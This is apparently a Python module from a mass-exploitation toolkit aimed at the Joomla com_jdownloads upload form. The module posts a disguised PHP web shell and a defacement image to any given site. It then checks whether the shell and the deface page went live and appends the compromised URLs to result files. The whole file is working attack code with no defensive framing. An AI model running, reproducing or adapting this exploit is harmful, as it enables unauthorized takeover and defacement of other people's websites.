# coding=utf-8
import requests
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
ZipJd = 'files/jdownlods.zip'
jdShell = 'files/neko.php3.j'
Jce_Deface_image = 'files/pwn.gif'


def Exploit(site):
    try:
        fileindex = {'file_upload': (ZipJd, open(ZipJd, 'rb'), 'multipart/form-data'),
                     'pic_upload': (jdShell, open(jdShell, 'rb'), 'multipart/form-data')}
        post_data = {
            'name': 'Senpai',
            'mail': 'senpai@tegalsec.org',
            'catlist': '1',
            'filetitle': "lolz",
            'description': "<p>zot</p>",
            '2d1a8f3bd0b5cf542e9312d74fc9766f': 1,
            'send': 1,
            'senden': "Send file",
            'description': "<p>qsdqsdqsdqsdqsdqsdqsd</p>",
            'option': "com_jdownloads",
            'view': "upload"
        }
        Exp = 'http://' + site + '/index.php?option=com_jdownloads&Itemid=0&view=upload'
        Got = requests.post(Exp, files=fileindex, data=post_data, timeout=10, headers=Headers)
        if '/upload_ok.png' in str(Got.content):
            checkUrl = 'http://' + site + '/images/jdownloads/screenshots/' + jdShell.split('/')[1]
            Check = requests.get(checkUrl, timeout=10, headers=Headers)
            if 'neko!!' in str(Check.content):
                ChecksHell = requests.get('http://' + site + '/images/neko.php', timeout=10, headers=Headers)
                CheckIndex = requests.get('http://' + site + '/neko.htm', timeout=10, headers=Headers)
                if 'neko!!' in str(ChecksHell.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/images/neko.php' + '\n')
                if 'neko!!' in str(CheckIndex.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/neko.htm' + '\n')
                    return printModule.returnYes(site, 'N/A', 'Com_Jdownloads', 'Joomla')
                else:
                    return Com_Jdownloads(site)
            else:
                return Com_Jdownloads(site)
        else:
            return Com_Jdownloads(site)
    except:
        return Com_Jdownloads(site)


def Com_Jdownloads(site):
    try:
        fileindex = {'file_upload': (ZipJd, open(ZipJd, 'rb'), 'multipart/form-data'),
                     'pic_upload': (Jce_Deface_image, open(Jce_Deface_image, 'rb'), 'multipart/form-data')}
        post_data = {
            'name': 'ur name',
            'mail': 'TTTnstT@aa.com',
            'catlist': '1',
            'filetitle': "lolz",
            'description': "<p>zot</p>",
            '2d1a8f3bd0b5cf542e9312d74fc9766f': 1,
            'send': 1,
            'senden': "Send file",
            'description': "<p>qsdqsdqsdqsdqsdqsdqsd</p>",
            'option': "com_jdownloads",
            'view': "upload"
        }
        Exp = 'http://' + site + '/index.php?option=com_jdownloads&Itemid=0&view=upload'
        Got = requests.post(Exp, files=fileindex, data=post_data, timeout=10, headers=Headers)
        if '/upload_ok.png' in str(Got.content):
            checkUrl = 'http://' + site + '/images/jdownloads/screenshots/' + Jce_Deface_image.split('/')[1]
            Check = requests.get(checkUrl, timeout=10, headers=Headers)
            if 'GIF89a' in str(Check.content):
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(checkUrl + '\n')
                return printModule.returnYes(site, 'N/A', 'Com_Jdownloads', 'Joomla')
            else:
                return printModule.returnNo(site, 'N/A', 'Com_Jdownloads', 'Joomla')
        else:
            return printModule.returnNo(site, 'N/A', 'Com_Jdownloads', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_Jdownloads', 'Joomla')
